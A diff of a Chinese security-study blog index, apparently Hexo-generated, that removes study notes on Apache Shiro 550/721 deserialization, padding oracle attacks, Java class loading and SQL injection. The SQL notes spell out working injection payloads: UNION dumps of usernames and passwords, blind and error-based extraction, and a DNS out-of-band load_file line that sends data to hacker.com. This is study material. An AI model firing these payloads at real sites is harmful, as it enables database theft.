@@ -212,7 +212,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-14 00:12:36" itemprop="dateModified" datetime="2026-06-14T00:12:36+08:00">2026-06-14</time>
+                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
               </span>
 
           
@@ -227,33 +227,14 @@
 
       
           <p>Shiro721的密钥修复成了随机生成的了，也就是说没有办法获得密钥了。</p>
-<p>我们对比一下shiro550和shiro721的代码。</p>
-<p>shiro721</p>
-<p><img src="/2026/06/13/shiro721/shiro1.png" alt="截图"></p>
-<p>shiro550</p>
-<p><img src="/2026/06/13/shiro721/shiro2.png" alt="截图"></p>
-<p>明显可以看出来，密钥的设置变了。</p>
-<p>下面我们看一下shiro721中是怎么设置密钥的。</p>
-<p><img src="/2026/06/13/shiro721/shiro3.png" alt="截图"></p>
-<p>有一个密钥生成器对象，然后将这个对象初始化，然后生成密钥。看一下密钥生成部分</p>
-<p><img src="/2026/06/13/shiro721/shiro4.png" alt="截图"></p>
-<p>总的来说就是使用engineGenerateKey()，我们看一下</p>
-<p><img src="/2026/06/13/shiro721/shiro5.png" alt="截图"></p>
-<p>可以看到密钥变成随机生成的了。</p>
-<p>Shiro721的漏洞就是可以进行Padding Oracle Attack。</p>
-<p><img src="/2026/06/13/shiro721/shiro6.png" alt="截图"></p>
-<p>我么看一下解密部分。</p>
-<p><img src="/2026/06/13/shiro721/shiro7.png" alt="截图"></p>
-<p>解密会走到这里，这个方法可以抛出两种异常，这两个异常都是padding相关的异常，跑出的两个异常会被下面这个方法接住</p>
-<p><img src="/2026/06/13/shiro721/shiro8.png" alt="截图"></p>
-<p>走到onRememberedPrincipalFailure()</p>
-<p><img src="/2026/06/13/shiro721/shiro9.png" alt="截图"></p>
-<p>可以看到会调用forgetIdentity()。之前在shiro550写过，这个方法会发Deleteme的Cookie。也就是说padding错误的时候会发Deleteme的Cookie。</p>
-<p>还有一个就是反序列化的时候的异常。</p>
-<p><img src="/2026/06/13/shiro721/shiro10.png" alt="截图"></p>
-<p>这个异常还是会被getRememberedPrincipal捕获。</p>
-<p>总之padding错了就会给DeleteMe。用Padding Oracle Attack。为了防止反序列化的时候给DeleteMe可以先拿一个Cookie然后再拿最后一个分组一个一个爆破。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/06/13/shiro721/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -303,7 +284,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-13 00:20:42" itemprop="dateModified" datetime="2026-06-13T00:20:42+08:00">2026-06-13</time>
+                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
               </span>
 
           
@@ -321,37 +302,14 @@
 <p>写这个主要是因为，在Shiro550中利用CC链的时候涉及到不能使用数组的问题。</p>
 </blockquote>
 <p>Shiro550中使用的是原生的反序列化，但是有一处需要注意。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl1.png" alt="截图"></p>
-<p>new的时候用的是ClassResolvingObjectInputStream()。</p>
-<p>我们来看一下这个类</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl2.png" alt="截图"></p>
-<p>他只重写了一个方法，而这个方法在反序列化的途中是必定会调用的，就是因为这个不能使用数组。</p>
-<p>我们先看一下Tomcat的类加载器</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl3.jpg" alt="截图"></p>
-<p>WebAppClassloader交给BootstrapClassloader，BootstrapClassloader没找到直接给到WebAppClassloader</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl4.png" alt="截图"></p>
-<p>用这个类加载器，跟进</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl5.png" alt="截图"></p>
-<p>这里就是loadClass的核心逻辑了。检查tomcat缓存里有没有类。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl6.png" alt="截图"></p>
-<p>检查jdk缓存里有没有。然后使用ExtClassloader(BootstrapClassloader没办法直接获得，就得让Ext帮忙代劳了，因为根据双亲委派会交给Bootstrap)</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl7.png" alt="截图"></p>
-<p>这里就是tomcat的类加载器工作的部分了。到这个findclass里面，总的来说他干的跟URLClassLoader的findclass一样。我们看一下</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl8.png" alt="截图"></p>
-<p>这是findclass，然后会走到findclassinternal</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl9.png" alt="截图"></p>
-<p>看注释，干的事情跟URLClassloader一样。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl10.png" alt="截图"></p>
-<p>最后调用defineclass。</p>
-<p>问题出在找不到路径。</p>
-<p>transformer传过去的时候长这样[Lorg.apache.commons.collections.Transformer; findclass将.换成&#x2F;加.class。没有这样的路径，他没有对[L做处理。</p>
-<p>jdk原生的类加载是对这种情况是做了处理的，而且forname是支持[L这种格式的，但是shiro走的是ClassUtils.forname，不是class.forname。</p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl11.png" alt="截图"></p>
-<p><img src="/2026/06/12/tomcatcl/tomcatcl12.png" alt="截图"></p>
-<p>可以看到他们都用了Class.forname，所以说这种数组类不能加载的情况要发生，还得是使用的类加载器得是webappclasloader这种情况。</p>
-<p>推荐视频: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2449663">https://cloud.tencent.com/developer/article/2449663</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/06/12/tomcatcl/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -393,10 +351,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-06-12 14:19:41 / 修改时间：17:05:57" itemprop="dateCreated datePublished" datetime="2026-06-12T14:19:41+08:00">2026-06-12</time>
+              <time title="创建时间：2026-06-12 14:19:41" itemprop="dateCreated datePublished" datetime="2026-06-12T14:19:41+08:00">2026-06-12</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
+              </span>
 
           
 
@@ -410,39 +374,14 @@
 
       
           <p><em><strong>双亲委派</strong></em></p>
-<p>当一个类加载器收到某个类加载请求时，该类加载器首先会把请求委派给父类加载器。每个类加载器都是如此，它会先委托父类加载器在自己的搜索范围内找不到对应的类时，该类加载器才会尝试自己去加载。</p>
-<p><img src="/2026/06/12/loadclass/loadclass1.png" alt="截图"></p>
-<p>先从下往上走到最顶部，然后再往下走。从最顶部开始谁把类给加载了，就结束了。</p>
-<p>这个父类是逻辑上的父类，他们之间是没有继承关系的。</p>
-<h4 id="Bootstrap-ClassLoader-（启动类加载器）"><a href="#Bootstrap-ClassLoader-（启动类加载器）" class="headerlink" title="Bootstrap ClassLoader （启动类加载器）"></a><strong>Bootstrap ClassLoader （启动类加载器）</strong></h4><p>启动类加载器负责加载$JAVA_HOME中jre&#x2F;lib&#x2F;rt.jar里面所有的class，由c++实现，不是classLoader子类</p>
-<h4 id="ExtensionClassLoader（扩展类加载器）"><a href="#ExtensionClassLoader（扩展类加载器）" class="headerlink" title="ExtensionClassLoader（扩展类加载器）"></a><strong>ExtensionClassLoader（扩展类加载器）</strong></h4><p>扩展类加载器由sun.misc.Launcher $ExtClassLoader实现，负责加载JRE的扩展目录，lib&#x2F;ext或者由java.ext.dirs系统属性指定的目录中的JAR包的类。由Java语言实现，父类加载器为null。</p>
-<h4 id="App-ClassLoader（应用类加载器）"><a href="#App-ClassLoader（应用类加载器）" class="headerlink" title="App ClassLoader（应用类加载器）"></a><strong>App ClassLoader（应用类加载器）</strong></h4><p>由sun.misc.Launcher $App-ClassLoader实现负，记载classpath中指定的jar包以及目录中class， 程序员一般会直接使用这个类加载器，如果程序员没有定义自己的类加载器，就作为应用程序的默认加载器。</p>
-<h4 id="User-ClassLoader（自定义类加载器）"><a href="#User-ClassLoader（自定义类加载器）" class="headerlink" title="User ClassLoader（自定义类加载器）"></a><strong>User ClassLoader（自定义类加载器）</strong></h4><p>大家开发的时候其实绝大多数都是使用应用类加载器，针对一些应用类加载器不能满足的情况下，可以考虑使用自定义类加载器，来满足实际开发的业务要求。</p>
-<p><em><strong>从这开始具体分析一下</strong></em></p>
-<p><img src="/2026/06/12/loadclass/loadclass2.png" alt="截图"></p>
-<p><img src="/2026/06/12/loadclass/loadclass3.png" alt="截图"></p>
-<p>我们使用的ClassLoader是Appclassloader，根据双亲委派就得给父类委托请求了。</p>
-<p>ucp.knownToNoExist(name)是说，这个类我已经知道不存在了不用找了。我们现在要加载的这个类是我们自己定义的已存在类。走到父类的loadClass()。</p>
-<p><img src="/2026/06/12/loadclass/loadclass4.png" alt="截图"></p>
-<p>这个是双亲委派的核心方法，先检查这个类是否已经加载过了，没有加载的话检查是否有父类加载器，如果有父类加载器则调用父类加载器的loadclass()，BootstrapClassloader使用c&#x2F;c++写的所以不能用 parent !&#x3D; null检查，所以单独整了一个分支。在BootstrapClassloader里没有找到，交给ExtClassloader，没有找到，交给AppClassloader，走到findClass()。</p>
-<blockquote>
-<p>Ext和App都是一样的，Ext也是走的findClass()，流程相同无非没找到类。</p>
-</blockquote>
-<p><img src="/2026/06/12/loadclass/loadclass6.png" alt="截图"></p>
-<p>为什么会到这个URLClassloader呢？</p>
-<p>URLClassLoader是Ext和App的继承关系的父类，而他们两没有findclass()方法，所以就用上父类的了。</p>
-<p>寻找方式就是路径+类名</p>
-<p>主要是这个defineClass，找到了以后有defineclass来加载</p>
-<p><img src="/2026/06/12/loadclass/loadclass7.png" alt="截图"></p>
-<p>点着defineclass()一直进去就行，这个defineClass1就会把字节码给加载了。</p>
-<p><img src="/2026/06/12/loadclass/loadclass8.png"></p>
-<p>可以看到是native方法。</p>
-<p>以上就是全部流程。</p>
-<p>最底层就是defineclass，再上层一点就是URLClassloader，创建URLClassloader的时候可以传路径过去，也就是ucp。调用loadclass，走到findclass时他会从路径中查找，能查到，最后就走到defineclass了。这个路径是可以解析不同协议的，例如:file,http,jar</p>
-<p>推荐视频:<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9/?p=4&spm_id_from=333.1387.top_right_bar_window_history.content.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV16h411z7o9/?p=4&amp;spm_id_from=333.1387.top_right_bar_window_history.content.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-<p>参考文章:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2009648">https://cloud.tencent.com/developer/article/2009648</a></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2009645">https://cloud.tencent.com/developer/article/2009645</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/06/12/loadclass/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -492,7 +431,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-13 14:22:23" itemprop="dateModified" datetime="2026-06-13T14:22:23+08:00">2026-06-13</time>
+                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
               </span>
 
           
@@ -507,50 +446,14 @@
 
       
           <p><em><strong>流程分析</strong></em></p>
-<p>登录以后会发一个Cookie给我们，这样下一次就会把Cookie发过去，免去登陆。</p>
-<p>看一下Cookie处理方法</p>
-<p><img src="/2026/06/11/shiro550/shiro1.png" alt="截图"></p>
-<p>从HTTP请求中获取Cookie，然后Base64解码。</p>
-<p>找一下谁调用了这个方法</p>
-<p><img src="/2026/06/11/shiro550/shiro2.png" alt="截图"></p>
-<p>可以看到接收到解码以后的Cookie,要将它转换成认证信息。跟进</p>
-<p><img src="/2026/06/11/shiro550/shiro3.png" alt="截图"></p>
-<p>解码完以后解密，解密完了然后反序列话。线看一下反序列化。</p>
-<p><img src="/2026/06/11/shiro550/shiro4.png" alt="截图"></p>
-<p>可以看到他调用的是原生的反序列化，也就是说调用传过来的序列化对象的readObject方法。如果有用一些有反序列化漏洞的依赖的话就可以利用了(CC什么的)。</p>
-<p>看一下解密部分</p>
-<p><img src="/2026/06/11/shiro550/shiro5.png" alt="截图"></p>
-<p>获取解密服务，然后解密。跟进</p>
-<p><img src="/2026/06/11/shiro550/shiro6.png" alt="截图"></p>
-<p>可以看到是个接口，关注点是两个参数，第一个参数是密文，第二个参数是密钥。既然如此就要关注getDecryptionCipherkey()这个方法了。</p>
-<p><img src="/2026/06/11/shiro550/shiro7.png" alt="截图"></p>
-<p><img src="/2026/06/11/shiro550/shiro8.png" alt="截图"></p>
-<p>得找一下谁设置了decryptionCipherKey</p>
-<p><img src="/2026/06/11/shiro550/shiro9.png" alt="截图"></p>
-<p>找一下谁调用了这个方法</p>
-<p><img src="/2026/06/11/shiro550/shiro10.png" alt="截图"></p>
-<p>再找一下谁掉用了这个方法</p>
-<p><img src="/2026/06/11/shiro550/shiro11.png" alt="截图"></p>
-<p><img src="/2026/06/11/shiro550/shiro12.png" alt="截图"></p>
-<p>可以看到他这个密钥是不变的常量，这个密钥我们是可以拿到的，我们这不都看到了吗，复制粘贴就行。</p>
-<p>有了密钥就可以把序列化的字节码加密，给到shiro以后shiro就会反序列化了。</p>
-<p>下面看一下Cookie是怎么设置的</p>
-<p>我们在登陆的时候点了Remember me的时候，看一下代码是怎么执行的。</p>
-<p><img src="/2026/06/11/shiro550/shiro15.png" alt="截图"></p>
-<p>登陆成功时先进行forgetIdentity()，我们看一下forgetIdentity()</p>
-<p><img src="/2026/06/11/shiro550/shiro16.png" alt="截图"></p>
-<p><img src="/2026/06/11/shiro550/shiro17.png" alt="截图"></p>
-<p>总之就是在登陆的时候先把，残留的cookie给删了。发送一个有效期为零的DeleteMe Cookie，这样浏览器收到以后就会删除Cookie了。</p>
-<p><img src="/2026/06/11/shiro550/shiro13.png" alt="截图"></p>
-<p>把残留的Cookie删了以后，就是再整一个这个身份的cookie了。我们看一下convertPrincipalsToBytes()方法。</p>
-<p><img src="/2026/06/11/shiro550/shiro18.png" alt="截图"></p>
-<p><img src="/2026/06/11/shiro550/shiro19.png" alt="截图"></p>
-<p>这个方法做的事情就是把身份信息序列化，然后加密，密钥的获取跟解密一样。</p>
-<p>最后就是设置Cookie啦</p>
-<p><img src="/2026/06/11/shiro550/shiro14.png" alt="截图"></p>
-<p>就是对传过来的字节数字Base64编码，然后设置</p>
-<p>推荐视频: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.1387.upload.video_card.click&vd_source=c4cebc18d34b17376b1b2a473da11100">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=c4cebc18d34b17376b1b2a473da11100</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/06/11/shiro550/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -592,10 +495,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-06-11 19:59:15 / 修改时间：20:24:41" itemprop="dateCreated datePublished" datetime="2026-06-11T19:59:15+08:00">2026-06-11</time>
+              <time title="创建时间：2026-06-11 19:59:15" itemprop="dateCreated datePublished" datetime="2026-06-11T19:59:15+08:00">2026-06-11</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
+              </span>
 
           
 
@@ -609,646 +518,14 @@
 
       
           <p>在分组加密算法中会进行分组。他的分组机制是这样子的，假如每一个分组的大小是8字节，将原文按8字节分组，这样就会有两种情况，一是能整除，二是没发整除。</p>
-<p>1.能整除: 能整除的时候也是会进行填充的，他会在最后再整一个分组添满0x08。</p>
-<p>2.不能整除: 显然最后一个分组不够，会对最后一个分组填充，缺一个补一个0x01，缺两个补两个0x02以此类推。</p>
-<p>分完组以后就是加密了。</p>
-<p>加密过程: 第一个分组与初始向量进行异或运算，将中间值使用密钥加密。第二个分组与第一个分组的加密密文进行异或运算，然后将中间值使用密钥加密。第三个分组与第二个分组的加密密文进行异或运算，然后将中间值使用密钥加密。以此类推。</p>
-<p>解密过程: 第一组密文使用密钥解密获得中间值，将中间值与初始向量进行异或运算获得第一组明文。第二组密文使用密钥解密获得中间值，将中间值与第一组密文进行异或运算获得第二组明文。第三组密文使用密钥解密获得中间值，将中间值与第二组密文进行异或运算获得第三组明文。以此类推。</p>
-<p>这个漏洞的目的是，能否在不获得密钥的情况下，明文是自己想要的。</p>
-<p>利用的是发送的密文解密以后，服务器的响应会有所不同。</p>
-<p>比如:收到有效密文的时候，响应200</p>
-<p>收到无效密文的时候，响应500</p>
-<p>收到一个有效密文，但是解密为无效值时，显示自定义错误信息。</p>
-<p>有点像sql盲注。</p>
-<p>这个密文解密以后，是否有效是看最后一个分组的最后一个字节。我们知道最后一个分组的最后一个字节只可能是0x01-0x08所以，所以检查最后一个字节是不是在这个范围内就可以了，同时还得满足0x01这种字节数数的数量跟他的值相匹配。</p>
-<p>初始向量和字节码是我们可以控制的</p>
-<p>漏洞利用: 最后一组密文用密钥解密后的中间值与上一组的密文进行异或运算后会得到明文，而这个明文是最后一组所以他的最后一个字节只可能是0x01-0x08，如果不是，服务器返回回来的是自定义信息错误，所以我们可以反复修改最后一组的上一组密文，直到解密后的最后一组明文是0x01这时服务器返回的消息是不同，这样我们就知道，此时的密文与中间值进行异或运算获得的是0x01，这样就能逆推出中间值的最后一个字节。以此类推知道推出所有中间值。所以说我们每次发密文和一个初始向量，爆破出中间值。</p>
-<p>这种方式我们可以进行这些操作: 1.我获得了密文，我想要将其破解。我可以发送初始向量以及一组密文，最后一组是有填充数据的，我们可以用最后一组密文。</p>
-<p>利用漏洞我们就知道了，最后一组密文的明文了。最后一组的上一组密文是没有填充数据的，既然如此就添加一个填充数据不就行了吗。我们发送的的是初始向量一组密文，所以说这一组密文是最后一组密文，必然有填充数据，但由于我们是截取的他没有填充数据这会有问题嘛？并没有。因为本质上我们想要的是中间值。我把所有分组的中间值给求出来以后，每一个中间值与上一组的密文进行异或运算就求出来明文了。所以说依然利用漏洞，让最后一个字节的解出来的明文成为0x01，以此类推，最后我们就知道明文是什么了。</p>
-<ol>
-<li>我想要构造合法的密文。我现在有我希望在服务器端解出来的明文。我么使用一组任意的8字节的字节码和初始向量一起发过去，爆破出中间值，知道了中间值就可以通过调整初始向量让他异或以后变成我想要的明文。将这个初始向量作为密文和一个初始向量发过去，爆破中间值，获得中间值调整初始向量。以此类推。</li>
-</ol>
-<p>参考文章: <a target="_blank" rel="noopener" href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">https://goodapple.top/2022/01/06/6db157fde87a6bae/</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/11/sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/11/sql/" class="post-title-link" itemprop="url">sql</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-06-11 19:12:54 / 修改时间：19:57:45" itemprop="dateCreated datePublished" datetime="2026-06-11T19:12:54+08:00">2026-06-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>总的来说就是字符串的拼接字符串</p>
-<p><em><strong>测试有没有sql注入</strong></em></p>
-<p>’ 报错说明有三个‘ 可以字符串拼接</p>
-<p>‘ and 1&#x3D;1 正常 and前面得是true</p>
-<p>‘ and 1&#x3D;2 异常 and前面得是true</p>
-<p>这样说明页面可控，就可能有sql注入漏洞</p>
-<p>万能密码:<code>1&#39; or &#39;1&#39; = &#39;1</code></p>
-<p>union select联合查询:</p>
-<p>select first_name from user_system_data union select login_count from user_data;</p>
-<p>联合查询要满足两个条件</p>
-<p>1.union前面select的数量和union后面select的数量要相同。</p>
-<p>也就是说select 1，2 from user union select 3，4 from password； 这样是可以的</p>
-<p>select 1，2，3 from user union select 4，5 from password； 这样是不行的</p>
-<p>2.查询的数据类型要相匹配</p>
-<p>可以是用order by来查清楚union前面select了几个。</p>
-<p>order by后面是可以写数字的，数字代表了第几列。</p>
-<p>也就是说order by 1的话就会按第一列排序，order by 2的话就会按第二列排序，order by 3的时候列数是不够的，数据库就会报错了，列数够的话就不会报错。</p>
-<p>所以我们就可以通过这个反应知道有几列。</p>
-<p>还有一种方式是使用NULL，也就是union select NULL— -，union select NULL，NULL— -以此类推，这样就能知道有几列了。这主要是因为NULL对于各种数据类型是兼容的。NULL的另一个用处就是知道每一列对应的数据类型，我们可以这样，在知道了有几列以后，union select ‘a’,NULL,NULL— -通过一个个的不断调整数据类型，直到匹配上，我们就知道数据类型是什么了。（注意这里的注释需要写成— -必须有这个空格，要不然会把—认为是字段）</p>
-<p>联合查询的一大用处就是可以查其他表的感兴趣的内容，还有一个就是可以使用返回对应数据类型的函数。</p>
-<p>例如</p>
-<p><strong>database()</strong>：获取当前数据库名。</p>
-<p><strong>user()</strong>：获取当前数据库用户名。</p>
-<p><strong>version()</strong>：获取数据库版本。</p>
-<p>SELECT id, title, content FROM articles WHERE id &#x3D; 1 UNION SELECT 1, database(), version()– -</p>
-<p>group_concat():联合查询的时候如果只显示一行的话就可以用这个函数，他会列指定的列里数据全部以一行的形式展示出来（其实不是全部由大小限制）。</p>
-<p>concat():主要用处是：<strong>把多个列的数据或者字符串，首尾相连地拼成一个大字符串。</strong></p>
-<p>网页通常只有一个显示位，黑客如果用了 UNION SELECT，一次只能看一个字段。如果黑客既想看用户名，又想看密码，难道要查两次吗？</p>
-<p>不需要，用 concat() 把它们打包成一句话：</p>
-<p><code>UNION SELECT 1, concat(username, &#39;:&#39;, password), 3 FROM users--+</code></p>
-<p>concat_ws():它是 concat() 的升级版 CONCAT_WS(‘分隔符’, 字段1, 字段2, 字段3…)</p>
-<p>limit():用来<strong>限制查询结果返回的行数</strong>。它有两个参数：LIMIT 偏移量, 几行</p>
-<p>LIMIT 0, 1：从第 0 行（也就是第 1 条数据）开始，只拿 1 行。</p>
-<p>LIMIT 1, 1：从第 1 行（也就是第 2 条数据）开始，只拿 1 行。</p>
-<p>group_concat()不让用了，或者对于展示的数据有大小限制什么的话，就可以用这个函数来显示别的行了</p>
-<p>任何人在 MySQL 中创建的每一个数据库、每一张表、每一个字段，都会被 MySQL 自动记录在一个叫 information_schema 的系统自带库里。</p>
-<p>你可以把它理解为<strong>数据库的中央档案馆</strong>。其中有两张表是黑客的财富密码：</p>
-<ul>
-<li><strong>information_schema.tables</strong>：记录了整个 MySQL 里面<strong>所有的表名</strong>。</li>
-<li><strong>information_schema.columns</strong>：记录了整个 MySQL 里面<strong>所有的列名（字段名）</strong>。</li>
-</ul>
-<p>在这张地图里，有两个核心字段需要认清：</p>
-<ul>
-<li>table_schema：代表这张表属于哪个<strong>数据库</strong>。</li>
-<li>table_name：代表这张表的<strong>表名</strong>。</li>
-</ul>
-<p>如果我们在普通的数据库命令行里，想查出 security 这个数据库里有哪些表，我们会写这样一句标准的 SQL：</p>
-<p><code>SELECT table_name FROM information_schema.tables WHERE table_schema = &#39;security&#39;;</code></p>
-<p>联合查询中的应用:</p>
-<p><code>-1&#39; UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = database()-- - </code></p>
-<p><em><strong>sql盲注</strong></em></p>
-<p>盲注就是不会让你看到你查询的信息。</p>
-<p>SUBSTRING(字符串, 开始位置, 截取长度)</p>
-<p>布尔型：</p>
-<p>虽然不会显示数据但会显示是否正常。</p>
-<p>所以说我们可以将要查询的一个字母一个字母的爆破，爆破对了她就会显示正常，错了就显示失败了。</p>
-<p>SELECT * FROM users WHERE id &#x3D; ‘1’ AND ascii(substr(database(),1,1)) &gt; 100 –+’</p>
-<p>可以通过二分发爆破出数据库的第一个字母，以此类推。and前面部分保证是正确的。</p>
-<p>ascii就是把它转换成ascii码，这样能避免使用‘（不用ascii的话就得跟字母比较就得写成‘a了），防火墙可能会把’给挡掉。</p>
-<p>时间型:</p>
-<p>他的回答不会因为是否正确而改变的话，可以这样写：</p>
-<p>– 问数据库：如果数据库名字的第一个字母是 ‘s’，你就给我睡 5 秒，否则返回 0</p>
-<p>?id&#x3D;1’ AND IF(substr(database(),1,1)&#x3D;’s’, sleep(5), 0) –+</p>
-<p><em><strong>报错注入</strong></em></p>
-<p>黑客故意输入错误的语法，强行引发数据库报错；但黑客在这段语法里塞了“私货”（比如查密码的命令），导致数据库在报错信息中，不小心把黑客想要的秘密给一起打印在屏幕上了。</p>
-<p>要想使用这个漏洞需要满足两个条件:</p>
-<p><strong>后端代码太粗心：</strong> 网站的开发人员没有关闭数据库的“错误回显”。程序在出错时，会毫无遮掩地把数据库报的错误原封不动地打印在网页上（例如：MySQL Error: …）。</p>
-<p><strong>利用了特定函数的逻辑漏洞：</strong> 数据库中有些函数，当接收到不符合规范的参数时，会把<strong>这个参数的内容</strong>直接放进报错信息里弹出来。</p>
-<p>updatexml(参数1, 参数2, 参数3):其中<strong>第二个参数</strong>要求必须是一个合法的 <strong>XPath 格式路径</strong>（类似于文件夹路径，比如 &#x2F;root&#x2F;user)</p>
-<p>– 故意制造路径错误的 Payload,塞进一个<strong>绝对不符合 XPath 路径规范的特殊字符</strong>（比如波浪号 ~），紧接着在后面拼接上想偷的数据（如 database()）。</p>
-<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, database()), 1) –+</p>
-<p>数据库会这样回答:ERROR 1105 (HY000): XPATH syntax error: ‘~security’</p>
-<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, (SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1)), 1) –+可以这么用</p>
-<p><strong>updatexml 报错注入，报错的回显最多为32位</strong></p>
-<p>extractvalue(XML_document，xpath_string)这个也一样</p>
-<p>1 or (extractvalue(1,concat(‘～’,(这里填写sql语句))))</p>
-<p>带外sql注入</p>
-<p>当网站做到了极致的防御：网页上<strong>不显示任何数据</strong>（无法 Union），<strong>不显示任何报错</strong>（无法报错注入），甚至还加了<strong>严格的频率限制</strong>（一旦你用盲注高频猜解，IP立刻被拉黑）。</p>
-<p>这时候，黑客就会利用<strong>带外通道</strong>：让受害服务器的数据库<strong>自己主动联网，把数据发送到黑客掌控的另一台外部服务器上</strong>。</p>
-<p>利用数据库自带的、可以发起网络请求的内置函数。最常被用来建立这种“带外通道”的协议是 <strong>DNS（域名系统）</strong>。</p>
-<p>MySQL 数据库在 Windows 服务器环境下（必须是windows）</p>
-<p>在 Windows 系统中，如果你尝试访问一个形如 \xxx.com\abc 的网络共享路径（称为 UNC 路径），系统为了解析 xxx.com 在哪里，会<strong>强制发送一个 DNS 请求</strong>。 MySQL 的 load_file() 函数正好支持读取网络路径。</p>
-<p>控制了hacker.com</p>
-<p>?id&#x3D;1’ AND load_file(concat(‘\\‘, (SELECT database()), ‘.hacker.com\abc’)) —+(在 SQL 语法中，<strong>反斜杠 \ 是一个特殊的“转义符”</strong>。它的作用是改变紧跟在它后面的那个字符的原本含义。 例如：&#39; 意味着“这只是一个普通的单引号字符，不是字符串的边界”。所以写了四个)</p>
-<p>concat会讲它拼成\数据库名称.<a target="_blank" rel="noopener" href="http://hacker.com/">hacker.com</a>\abc</p>
-<p>load_file() 尝试去读取这个路径。为了找到这个路径，受害服务器开始查 DNS。</p>
-<p>解释一下DNS解析：</p>
-<p>当受害服务器大喊：“谁知道 security.hacker.com 的 IP 是多少？”时，全球的 DNS 解析网络开始了一场接力赛：</p>
-<ol>
